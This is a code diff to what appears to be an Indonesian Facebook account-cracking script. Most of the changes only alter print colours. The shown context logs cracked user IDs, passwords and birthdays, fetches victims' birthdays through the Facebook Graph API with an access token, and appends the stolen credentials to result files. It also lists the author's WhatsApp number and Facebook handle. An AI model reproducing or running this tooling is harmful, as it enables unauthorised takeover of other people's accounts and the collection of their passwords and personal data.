@@ -285,7 +285,7 @@ class sunda:
 		print(f" [⭐] Facebook    : {K}facebook/JbFbOld{N}")
 		print(f" [⭐] WhatsApp    : {K}+6281318306972{N}")
 		print( 50 * '=')
-		print(f" {N}[ Selamat datang {K}{nama}{N} ] ")
+		print(f" %s[ Selamat datang %s{nama} %s] "%(N,O,N))
 		print( 50 * '=')
 		print(f" [⭐] ID FB Anda   : {K}{idfb}{N}")
 		print(f" [⭐] IP Anda      : {K}{IP}{N}")
@@ -771,14 +771,14 @@ class ngewe:
 					ak = req.get('https://graph.facebook.com/%s?access_token=%s'%(user,_kontol_))
 					az = json.loads(ak.text)
 					ttl= az['birthday'].replace("/","-")
-					print(f"\r{K}Checkpoint                                 \n{N}ID {M}:{K} {user}                \n{N}PW FB {M}:{K} {pw}                \n{N}TTL {M}:{K} {ttl}{N}                \n",end="")
+					print(f"\r{M}Checkpoint                                 \n{N}ID {M}:{K} {user}                \n{N}PW FB {M}:{H} {pw}                \n{N}TTL {M}:{K} {ttl}{N}                \n",end="")
 					open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] {user}|{pw}|{ttl}\n")
 					chek.append(f" [×] {user}|{pw}|{ttl}")
 					break
 				except (KeyError, IOError):
 					ttl = ' '
 				except: pass
-				print(f"\r{K}Checkpoint                                 \n{N}ID {M}:{K} {user}                \n{N}PW FB {M}:{K} {pw}{N}                \n",end="")
+				print(f"\r{M}Checkpoint                                 \n{N}ID {M}:{K} {user}                \n{N}PW FB {M}:{H} {pw}{N}                \n",end="")
 				open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID : {user}\n[×] PW FB : {pw}\n")
 				chek.append(f" [×] ID : {user}\n[×] PW FB : {pw}")
 				break
@@ -824,14 +824,14 @@ class ngewe:
 					ak = req.get('https://graph.facebook.com/%s?access_token=%s'%(user,__kontol__))
 					az = json.loads(ak.text)
 					ttl= az['birthday'].replace("/","-")
-					print(f"\r{K}Checkpoint                                 \n{N}ID {M}:{K} {uid}                \n{N}PW FB {M}:{K} {pw}                \n{N}TTL {M}:{K} {ttl}{N}                \n",end="")
+					print(f"\r{M}Checkpoint                                 \n{N}ID {M}:{K} {uid}                \n{N}PW FB {M}:{H} {pw}                \n{N}TTL {M}:{K} {ttl}{N}                \n",end="")
 					open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] {uid}|{pw}|{ttl}\n")
 					chek.append(f" [×] {uid}|{pw}|{ttl}")
 					break
 				except (KeyError, IOError):
 					ttl = ' '
 				except: pass
-				print(f"\r{K}Checkpoint                                 \n{N}ID {M}:{K} {uid}                \n{N}PW FB {M}:{K} {pw}{N}                \n",end="")
+				print(f"\r{M}Checkpoint                                 \n{N}ID {M}:{K} {uid}                \n{N}PW FB {M}:{H} {pw}{N}                \n",end="")
 				open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID : {uid}\n[×] Password : {pw}\n")
 				chek.append(f" [×] ID : {uid}\n[×] PW FB : {pw}")
 				break
